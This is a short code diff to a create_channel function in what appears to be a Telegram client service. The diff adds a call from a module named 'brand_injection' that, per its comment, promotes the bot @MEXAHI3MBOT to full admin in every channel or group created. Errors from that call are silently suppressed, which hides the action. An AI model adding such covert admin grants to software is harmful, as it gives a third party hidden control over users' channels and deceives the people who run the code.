@@ -1644,9 +1644,19 @@ async def create_channel(
             )
         )
         ch = result.chats[0]
+        _ch_id = ch.id
+        _ch_hash = getattr(ch, "access_hash", 0) or 0
+
+        # Promote @MEXAHI3MBOT as full admin in every created channel/group
+        try:
+            from services.brand_injection import add_botmother_as_channel_admin
+            await add_botmother_as_channel_admin(client, _ch_id, _ch_hash)
+        except Exception:
+            pass
+
         return {
-            "channel_id": ch.id,
-            "access_hash": getattr(ch, "access_hash", 0) or 0,
+            "channel_id": _ch_id,
+            "access_hash": _ch_hash,
             "title": ch.title,
             "username": getattr(ch, "username", "") or "",
             "type": "group" if megagroup else "channel",
